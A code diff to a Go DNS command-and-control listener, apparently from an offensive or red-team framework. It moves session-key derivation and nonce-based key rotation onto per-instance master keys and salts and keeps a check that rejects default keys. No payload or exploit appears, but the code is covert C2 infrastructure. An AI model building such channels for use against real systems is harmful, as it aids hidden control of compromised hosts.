@@ -47,6 +47,10 @@ type Listener struct {
 
 	listenerDomain string
 	dnsLabelPrefix string
+	// masterKey / salt 本监听器的会话密钥派生材料（已归一化为 32/16 字节）。
+	// 多实例下必须用实例自己的：按类型查库只能取到任意一行。
+	masterKey []byte
+	salt      []byte
 
 	dnsClients     map[string]*dnsClientInfo // uid -> client info
 	dnsClientsLock sync.RWMutex
@@ -141,11 +145,13 @@ func (l *Listener) stripLabelPrefix(tag string) string {
 // Start 启动一个 DNS C2 监听器实例。
 // key 用于登记/注销（即该监听器的 listen_address）；addr 是实际绑定的 UDP 地址；
 // domain / labelPrefix 来自该监听器配置与 C2 Profile（客户端生成时 patch 同一前缀，两端必须一致）。
-func Start(key, addr, domain, labelPrefix string) (*Listener, error) {
+func Start(key, addr, domain, labelPrefix string, masterKey, salt []byte) (*Listener, error) {
 	l := &Listener{
 		addr:            addr,
 		listenerDomain:  domain,
 		dnsLabelPrefix:  labelPrefix,
+		masterKey:       masterKey,
+		salt:            salt,
 		dnsClients:      make(map[string]*dnsClientInfo),
 		resultBuffers:   make(map[string]dnsBufferEntry),
 		metaInfoBuffers: make(map[string]dnsBufferEntry),
@@ -327,13 +333,11 @@ func (l *Listener) registerClient(metainfo []byte, clientIP string) string {
 	// 生成会话密钥（首次注册或重连协商；mi 分块重复调用由 HasPendingNonce 防重，
 	// 防止派生覆盖唯一化后的密钥——派生/旋转都必须在同一次协商中原子完成）
 	if encrypt.GlobalKeyManager != nil && !encrypt.HasPendingNonce(uid) {
-		_, encryptionSalt := encrypt.GetListenerKeyConfig("dns")
-		if _, err := encrypt.GlobalKeyManager.DeriveSessionKeyForListener(uid, encryptionSalt, "dns"); err == nil {
+		if _, err := encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, l.salt, l.masterKey, l.salt); err == nil {
 			// 【会话密钥唯一化】重派生并暂存 nonce，待客户端首个轮询 pull 时下发
 			nonce := make([]byte, 16)
 			if _, err := rand.Read(nonce); err == nil {
-				vkey, _ := encrypt.GetListenerKeyConfig("dns")
-				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, encryptionSalt, []byte(vkey), encryptionSalt, nonce)
+				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, l.salt, l.masterKey, l.salt, nonce)
 				if err != nil {
 					logx.Warnf("⚠️ [DNS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化失败: %v\n", uid, err)
 				} else {
@@ -575,7 +579,7 @@ func (l *Listener) handleMetaInfo(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, 
 		w.WriteMsg(m)
 		return
 	}
-	metaMK, metaSalt := encrypt.GetListenerKeyConfig("dns")
+	metaMK, metaSalt := l.masterKey, l.salt
 	// J4: 拒绝公开默认密钥连接
 	if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
 		logx.Warnf("⚠️ [DNS-METAINFO] 监听器使用公开默认密钥，拒绝注册\n")
